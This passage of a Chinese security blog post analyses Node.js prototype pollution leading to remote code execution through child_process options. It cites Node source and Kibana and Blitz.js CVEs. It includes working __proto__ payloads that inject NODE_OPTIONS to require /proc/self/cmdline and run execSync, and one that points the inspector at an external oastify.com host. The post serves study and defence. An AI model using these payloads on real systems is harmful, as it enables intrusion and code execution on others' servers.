language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;process.argv:&#x27;</span>, process.<span class="property">argv</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;process.argv0:&#x27;</span>, process.<span class="property">argv0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 /proc/self/cmdline</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cmdline = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/proc/self/cmdline&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27;\0&#x27;</span>).<span class="title function_">filter</span>(<span class="title class_">Boolean</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;cmdline:&#x27;</span>, cmdline);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bash and res</span></span><br><span class="line">node parent.<span class="property">js</span></span><br><span class="line"><span class="attr">stdout</span>: process.<span class="property">argv</span>: [</span><br><span class="line">  <span class="string">&#x27;/usr/bin/node&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;/home/kc1zs4/Code/CodeVscode/Notes/WLabs/1/child.js&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="attr">stdout</span>: process.<span class="property">argv0</span>: customNode</span><br><span class="line"></span><br><span class="line"><span class="attr">stdout</span>: <span class="attr">cmdline</span>: [ <span class="string">&#x27;customNode&#x27;</span>, <span class="string">&#x27;./child.js&#x27;</span> ]</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h4 id="深入理解shell"><a href="#深入理解shell" class="headerlink" title="深入理解shell"></a>深入理解shell</h4><ol>
+<li><p>Q: shell属性如何和argv0属性进行协作？</p>
+<ol>
+<li>A: <a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L429">源码部分</a>见下，可知argv0并不会影响传入shell的命令，只是会影响传入子进程的argv0，同时进行测试可以知道分析是正确的，<em><strong>同时在此处shell对我们想要的命令的执行几乎是没有影响的</strong></em></li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="string">&#x27;ls&#x27;</span>, [], &#123; <span class="attr">argv0</span>: <span class="string">&#x27;pwd&#x27;</span>, <span class="attr">shell</span>: <span class="string">&#x27;/bin/sh&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">child.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line">child.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src</span></span><br><span class="line"><span class="keyword">if</span> (options.<span class="property">shell</span>) &#123;</span><br><span class="line">   <span class="keyword">const</span> command = [file].<span class="title function_">concat</span>(args).<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;win32&#x27;</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">       file = options.<span class="property">shell</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       file = process.<span class="property">env</span>.<span class="property">comspec</span> || <span class="string">&#x27;cmd.exe&#x27;</span>;</span><br><span class="line">     args = [<span class="string">&#x27;/d&#x27;</span>, <span class="string">&#x27;/s&#x27;</span>, <span class="string">&#x27;/c&#x27;</span>, <span class="string">`&quot;<span class="subst">$&#123;command&#125;</span>&quot;`</span>];</span><br><span class="line">     options.<span class="property">windowsVerbatimArguments</span> = <span class="literal">true</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">       file = options.<span class="property">shell</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;android&#x27;</span>)</span><br><span class="line">       file = <span class="string">&#x27;/system/bin/sh&#x27;</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       file = <span class="string">&#x27;/bin/sh&#x27;</span>;</span><br><span class="line">     args = [<span class="string">&#x27;-c&#x27;</span>, command];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">argv0</span> === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">  args.<span class="title function_">unshift</span>(options.<span class="property">argv0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  args.<span class="title function_">unshift</span>(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line"><span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">  envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="核心思想和payloads"><a href="#核心思想和payloads" class="headerlink" title="核心思想和payloads"></a>核心思想和payloads</h4><blockquote>
+<p>这里是根据自己理解的，忽略了一些关于shell参数的</p>
+</blockquote>
+<ol>
+<li><em><strong>这里其实也是一样的绕过思路</strong></em>，通过NODE_OPTIONS了指定require的文件来执行，这里由于无法控制<code>/proc/self/environ</code>从而转向<code>/proc/self/cmdline</code><ol>
+<li><p>再点一下<code>require()</code>函数: 把读取到的内容放到一个自执行函数中执行(所以可以用来执行命令)，返回module.exports需要导出的内容 -&gt; 为什么官方文档没有找到？纳尼</p>
+</li>
+<li><p>payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/cmdline&quot;, &quot;argv0&quot;: &quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce2\\\&quot;).toString())//&quot;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h3 id="RCE-via-Inspector"><a href="#RCE-via-Inspector" class="headerlink" title="RCE via Inspector"></a>RCE via Inspector</h3><ol>
+<li><p>node运行时允许添加<code>--inspect=host:port</code>格式来设置调试服务器监听的主机地址，<a target="_blank" rel="noopener" href="https://www.nodeapp.cn/cli.html#cli_inspect_host_port">详见文档</a></p>
+<ol>
+<li>需要注意防火墙的问题</li>
+</ol>
+</li>
+<li><p>payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;argv0&quot;</span>:<span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="string">&quot;shell&quot;</span>:<span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NODE_OPTIONS&quot;</span>:<span class="string">&quot;--inspect=id\&quot;\&quot;.oastify\&quot;\&quot;.com&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>实际应用????</p>
+</li>
+</ol>
+<h3 id="Defence-Patch"><a href="#Defence-Patch" class="headerlink" title="Defence Patch"></a>Defence Patch</h3><ol>
+<li>由于js原型的特殊性质，涉及到判断的属性最好都提前预设值，否则可以借助原型链污染进行设置 –&gt; 这就是env, shell, argv0可以进行污染的一个原因，因为原型无法覆盖上层值</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#child-process-spawn-%E6%B7%B1%E5%85%A5%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">child_process.spawn()深入部分源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-via-env"><span class="toc-number">2.</span> <span class="toc-text">RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-proc-self-environ"><span class="toc-number">2.1.</span> <span class="toc-text">深入理解&#x2F;proc&#x2F;self&#x2F;environ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payloads%E5%92%8C%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3"><span class="toc-number">2.2.</span> <span class="toc-text">payloads和核心思想</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-via-cmdline"><span class="toc-number">3.</span> <span class="toc-text">RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">分析一下源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3argv0"><span class="toc-number">3.2.</span> <span class="toc-text">深入理解argv0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3shell"><span class="toc-number">3.3.</span> <span class="toc-text">深入理解shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3%E5%92%8Cpayloads"><span class="toc-number">3.4.</span> <span class="toc-text">核心思想和payloads</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-via-Inspector"><span class="toc-number">4.</span> <span class="toc-text">RCE via Inspector</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Defence-Patch"><span class="toc-number">5.</span> <span class="toc-text">Defence Patch</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/02/pp2rce/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&text=pp2rce"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&is_video=false&description=pp2rce"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pp2rce&body=Check out this article: https://kc1zs4.github.io/2024/11/02/pp2rce/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&name=pp2rce&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/02/pp2rce/&t=pp2rce"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
